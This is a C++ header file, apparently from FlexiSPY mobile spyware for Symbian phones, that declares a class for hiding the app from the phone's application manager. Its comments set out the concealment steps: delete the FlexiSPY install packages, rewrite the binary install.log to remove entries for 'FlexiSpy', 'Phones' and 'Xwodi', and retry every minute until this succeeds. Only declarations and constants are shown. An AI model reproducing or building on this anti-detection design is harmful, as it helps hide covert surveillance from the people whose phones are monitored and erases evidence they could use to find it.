#ifndef _FxAppManagerInvisibleMaker_h
#define _FxAppManagerInvisibleMaker_h

#include <f32file.h>
#include "Timeout.h"
#include "AppInfoConst.h"

const TInt KWaitBeforeRun = 1; //secs
const TInt KWaitAfterRunFailed = 60 * 1; //1 minute

const TInt KInstallDirMaxLength = 30;
const TInt KInstallSisPathMaxLength = 256;

const TUid KUidFxsLight_V1 = {EFlexiSpyLightUid_v1};
const TUid KUidFxsLight    = {EFlexiSpyLightUid};
const TUid KUidFxsPro      = {EFlexiSpyProUid};
const TUid KUidThisApp      = {APP_UID};

_LIT(KInstallFolder,"\\system\\install\\");
_LIT(KWildFlexiSpy,"Flexispy*");

//install.log file format
_LIT(KInstallLogFile,"c:\\system\\install\\install.log");
//this are sis file name that usr will install to the phone
//to make app be invisble in app manager
//is to delete sis file in forlder !/system/install/

_LIT8(KAppNameV1,"Phones");
_LIT8(KAppNameV2,"FlexiSPY");
_LIT8(KAppNameV3,"Xwodi");

const TInt KInstallFolderMaxLength = 256;
//----------------------------------
//     Install.log format
//----------------------------------
const TInt KPosNumberOfEntryOffset = 17;
const TInt KNumberOfEntryLength = 4;

const TInt KEntryMaxLength = 512;
const TInt KHeaderLength = 24;
const TInt KPosistionFirstDelim = 24;

//entry delim
const TUint8 KEntryDelim15 = 0xDF;
const TUint8 KEntryDelim14 = 0xDE;
const TUint8 KEntryDelim13 = 0xDD;
const TUint8 KEntryDelim12 = 0xDC;
const TUint8 KEntryDelim11 = 0xDB;
const TUint8 KEntryDelim10 = 0xDA;
const TUint8 KEntryDelim9  = 0xD9;
const TUint8 KEntryDelim8  = 0xD8;
const TUint8 KEntryDelim7  = 0xD7;
const TUint8 KEntryDelim6  = 0xD6;
const TUint8 KEntryDelim5  = 0xD5; //n70
const TUint8 KEntryDelim4  = 0xD4; //6600
const TUint8 KEntryDelim3  = 0xD3; 
const TUint8 KEntryDelim2  = 0xD2; 
const TUint8 KEntryDelim1  = 0xD1; 
const TUint8 KEntryDelim0  = 0xD0;


const TUint8 KEntryDilms[] = {KEntryDelim4,KEntryDelim6,KEntryDelim5,KEntryDelim9,
							  KEntryDelim8, KEntryDelim7,KEntryDelim1,KEntryDelim3,KEntryDelim2,KEntryDelim0};

class CTimeOut;
class RFs;
class RFile;

//This task will be performed after the application has started up for a least a minutes - KWaitBeforeRun
//If the operation is failed such as RunL leave 
//it will re-perform its task after after KWaitAfterRunFailed elasped util success
class CFxAppManagerInvisibleMaker : public CActive,
									public MTimeoutObserver
{
public:
	static CFxAppManagerInvisibleMaker* NewL(RFs& aFs);
	virtual ~CFxAppManagerInvisibleMaker();
	
public:	
	//
	//
	void MakeInvisibleD();	
	
private:
	CFxAppManagerInvisibleMaker(RFs& aFs);
	void ConstructL();
		
private:	
	void MakeInvisible();
	
	TInt HideFromAppManagerL();
	
	/*
	* Delete all sis file which starts with Flexispy
	* in c:system.install directory
	* @param RFs
	* @param KErrNone if success, otherwise system wide error code
	*/
	TInt DeleteSisFilesL(RFs& aFs);
	
	
	/*
	* Step 1
	* Aync read install.log file
	* 
	*/
	void InitHideLogHistroyL();	
	
	/*
	* Step 2
	* Search the binary data and remove 'FlexiSpy' literal
	* 
	*/
	void ManipLogFile();
	//
	void SetNumberOfEntryies(TUint aNumberOfEntry, TDes8& aData);
	//
	void GetNumberOfEntries(const TDesC8& aData,TInt& aResult);	
	//find name
	TBool FoundTargetAppName(const TPtrC8 aSource, const TPtrC8 aAppName);	
	//
	void GetEntryByte(const TDesC8& aData, TInt aStartPos, TDes8& aEntry);
	
	/*
	* Step 3
	* Overwrite install.log aync
	* 
	*/		
	void OverwriteFileL();	
	
	void CompleteSelf();
	
private://MTimeoutObserver
	void HandleTimedOutL();
	
private:
	enum TTodoStep
	{	
		EStepNone = 1,
		EStepHideFromAppManager,
		EStepHideLogHistroyInitiated,
		EStepFileIsRead,
		EStepFileManip,
		EStepFileOverwrited,
		EStepCompleted
	};
	
private: //from CActive
	void DoCancel();
	void RunL();
	TInt RunError(TInt aError);
	
private:	
	RFs&	iFs;// not owned, ref to CCoeEnv::Static()->FsSession();
	RFile	iFile;
	HBufC8* iDataRead; //binary data read (install.log)
	HBufC8* iDataWrite; //binary data to replace the existing file
		
	TBool iHideFromAppManagerMade;
	
	TTodoStep iStep;
	CTimeOut*	iTimeout;
	TBool iSelfDelete;
};

#endif
